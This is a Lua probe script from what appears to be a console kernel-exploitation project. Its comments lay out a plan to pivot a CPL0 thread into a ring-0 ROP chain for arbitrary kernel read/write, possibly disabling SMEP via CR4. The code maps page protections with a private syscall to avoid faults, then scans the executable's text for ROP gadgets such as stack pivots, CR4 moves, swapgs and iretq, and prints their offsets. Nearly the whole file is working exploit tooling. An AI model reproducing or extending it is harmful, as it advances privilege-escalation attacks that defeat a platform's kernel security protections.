-- CRASH_CLASS: LOW (reads only pages that sys 547 reports readable, inside eboot's own RX text)
-- PROBE 1361a: eboot gadget inventory via dword reads (1360a's bulk read faulted)
--
-- 1360a called memory.read_buffer(addr, 0x10000) in a loop and the process died
-- inside the loader's own native handler (results/phase35_dead_end_reruns/
-- 1360a_eboot_ring0_gadgets_20261109_113530.txt: SIGSEGV, fault address 0x800,
-- 0x118-byte dump). That handler is lua_pushlstring(L, addr, size)
-- (`.local/loader_payload/native.lua:65-79`), so the bulk size is not a proven
-- path; memory.read_dword is - 1403h scanned 1.1 MB that way and completed twice
-- (results/phase14_kernel_read/1403h_gadget_scan_fast_20261105_062427.txt and
-- ..._062908.txt).
--
-- This probe rebuilds the bulk scan out of read_dword: 1024 reads per 4 KB page
-- assembled into a Lua string, matched with string.find(plain=true), with a
-- 16-byte overlap between pages so a gadget straddling a page boundary is found.
-- Before scanning, sys 547 is asked about every 64 KB block and the block is
-- skipped unless its protection is 3 (RW) or 5 (RX): the loader dies on a fault
-- even inside pcall (probes/phase17_new_vectors/114a_secC.lua:264-272 cites 114b),
-- and module pages with protection 1 (execute-only) kill the reader.
--
-- Purpose: the 417 trapframe primitive (1359a) leaves the thread at CPL0 holding
-- the kernel stack pointer, so `pop rsp; ret` plus a user ROP stack is the pivot
-- into a ring-0 chain. Every gadget in that chain must sit in a page that is
-- already executable for this process (our own mmap buffers are NX: 424a-424c).
-- If SMEP is off on 14.10 - the 13.60 dump never enables SMAP, and SMEP has an
-- unconditional enable site at 0x8dd182 plus a cpuid-guarded one at 0x81de8e -
-- then this inventory is the whole remaining requirement for arbitrary kernel R/W.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1360a_eboot_ring0_gadgets_20261109_113530.txt
--   results/phase14_kernel_read/1403h_gadget_scan_fast_20261105_062908.txt
--   probes/phase14_kernel_read/1403h_gadget_scan_fast.lua:33-60
--   probes/phase17_new_vectors/114a_secC.lua:264-272 (547 region query)
--   probes/phase17_new_vectors/106a_sigreturn_srop.lua:80-95 (593 eboot base)

print("=== PROBE 1361a: EBOOT GADGET INVENTORY (dword path) ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rdP(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return N(v) end
    return nil
end
-- scan loop: no pcall, the wrapper costs more than the read
local function rd(a) return N(memory.read_dword(a)) end

local sc593 = mk(593)
local sc547 = mk(547)
local sc20 = mk(20)

local okp, pv = pcall(function() return sc20() end)
local pid = okp and N(pv) or 0

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rdP(N(info) + 0x108) or 0
local eb_hi = rdP(N(info) + 0x10C) or 0
local eb_size = rdP(N(info) + 0x110) or 0
local EBN = N(eb_lo) + N(eb_hi) * 4294967296
print(string.format("[0] eboot text base=0x%X size=0x%X pid=%d", EBN, eb_size, pid))

-- [1] protection map from sys 547, 64 KB granularity
local qout = memory.alloc(0x40)
local BLOCK = 0x10000
local order = {}
local map = {}
local function prot_of(addr)
    local ok, rv = pcall(function() return sc547(uint64(addr), uint64(qout)) end)
    if not ok then return nil end
    if N(rv) ~= 0 then return nil end
    return rdP(N(qout) + 4)
end
print("")
print("[1] 547 protection map (64 KB blocks):")
local limit = eb_size
if limit <= 0 or limit > 0x800000 then limit = 0x800000 end
do
    local off = 0
    while off < limit do
        local p = prot_of(EBN + off)
        map[off] = p
        order[#order + 1] = off
        print(string.format("    +0x%06X  prot=%s", off, p and string.format("0x%X", p) or "none"))
        off = off + BLOCK
    end
end

-- [2] gadget scan over readable blocks only
local PATS = {
    { name = "pop rsp; ret",        p = "\x5C\xC3",           want = 8 },
    { name = "pop rax; ret",        p = "\x58\xC3",           want = 4 },
    { name = "pop rdi; ret",        p = "\x5F\xC3",           want = 4 },
    { name = "pop rsi; ret",        p = "\x5E\xC3",           want = 4 },
    { name = "pop rdx; ret",        p = "\x5A\xC3",           want = 4 },
    { name = "pop rbx; ret",        p = "\x5B\xC3",           want = 4 },
    { name = "mov rax,cr4; ret",    p = "\x0F\x20\xE0\xC3",   want = 4 },
    { name = "mov cr4,rax; ret",    p = "\x0F\x22\xE0\xC3",   want = 4 },
    { name = "mov [rdi],rax; ret",  p = "\x48\x89\x07\xC3",   want = 6 },
    { name = "mov rax,[rdi]; ret",  p = "\x48\x8B\x07\xC3",   want = 6 },
    { name = "mov [rsi],rax; ret",  p = "\x48\x89\x06\xC3",   want = 4 },
    { name = "mov rax,[rsi]; ret",  p = "\x48\x8B\x06\xC3",   want = 4 },
    { name = "mov [rdi],rbx; ret",  p = "\x48\x89\x1F\xC3",   want = 4 },
    { name = "mov eax,ebx; ret",    p = "\x89\xD8\xC3",       want = 4 },
    { name = "mov rax,rbx; ret",    p = "\x48\x89\xD8\xC3",   want = 4 },
    { name = "cpuid; ret",          p = "\x0F\xA2\xC3",       want = 4 },
    { name = "swapgs",              p = "\x0F\x01\xF8",       want = 4 },
    { name = "iretq",               p = "\x48\xCF",           want = 4 },
}
local CPUID = "\x0F\xA2"

local hits = {}
local counts = {}
for i = 1, #PATS do hits[i] = {}; counts[i] = 0 end
local cpuid_sites = {}

local scanned_bytes = 0
local scanned_blocks = 0
local PAGE = 0x1000
local OVER = 16

for _, blk_off in ipairs(order) do
    local prot = map[blk_off]
    if prot == 3 or prot == 5 then
        scanned_blocks = scanned_blocks + 1
        local prev_tail = ""
        local off = blk_off
        local blk_end = blk_off + BLOCK
        while off < blk_end do
            local parts = {}
            local ok_page = true
            for d = 0, PAGE / 4 - 1 do
                local v = rd(EBN + off + d * 4)
                local b0 = v % 256
                local b1 = math.floor(v / 256) % 256
                local b2 = math.floor(v / 65536) % 256
                local b3 = math.floor(v / 16777216) % 256
                parts[#parts + 1] = string.char(b0, b1, b2, b3)
            end
            if not ok_page then
                print(string.format("    [read fail at +0x%X - skipping block]", off))
                break
            end
            local page = prev_tail .. table.concat(parts)
            scanned_bytes = scanned_bytes + PAGE
            local base = off - #prev_tail
            for i = 1, #PATS do
                local init = 1
                while true do
                    local a = string.find(page, PATS[i].p, init, true)
                    if not a then break end
                    counts[i] = counts[i] + 1
                    if #hits[i] < PATS[i].want then
                        hits[i][#hits[i] + 1] = base + a - 1
                    end
                    init = a + 1
                    if init > #page then break end
                end
            end
            -- cpuid sites with a 16-byte window
            local init = 1
            while #cpuid_sites < 10 do
                local a = string.find(page, CPUID, init, true)
                if not a then break end
                local w = {}
                local tail = string.sub(page, a, a + 15)
                for j = 1, #tail do w[#w + 1] = string.format("%02X", string.byte(tail, j)) end
                cpuid_sites[#cpuid_sites + 1] = { off = base + a - 1, hex = table.concat(w, " ") }
                init = a + 1
                if init > #page then break end
            end
            prev_tail = string.sub(page, -OVER)
            off = off + PAGE
        end
        print(string.format("[2] block +0x%06X done, scanned=0x%X", blk_off, scanned_bytes))
    end
end

print("")
print(string.format("[3] scanned %d readable 64KB blocks, %d bytes", scanned_blocks, scanned_bytes))
print("")
for i = 1, #PATS do
    print(string.format("[%s] count=%d", PATS[i].name, counts[i]))
    for k = 1, #hits[i] do
        print(string.format("    eboot+0x%X", hits[i][k]))
    end
end
print("")
print("[cpuid sites]")
for k = 1, #cpuid_sites do
    print(string.format("    eboot+0x%X  %s", cpuid_sites[k].off, cpuid_sites[k].hex))
end
print("")
print("=== PROBE 1361a COMPLETE ===")
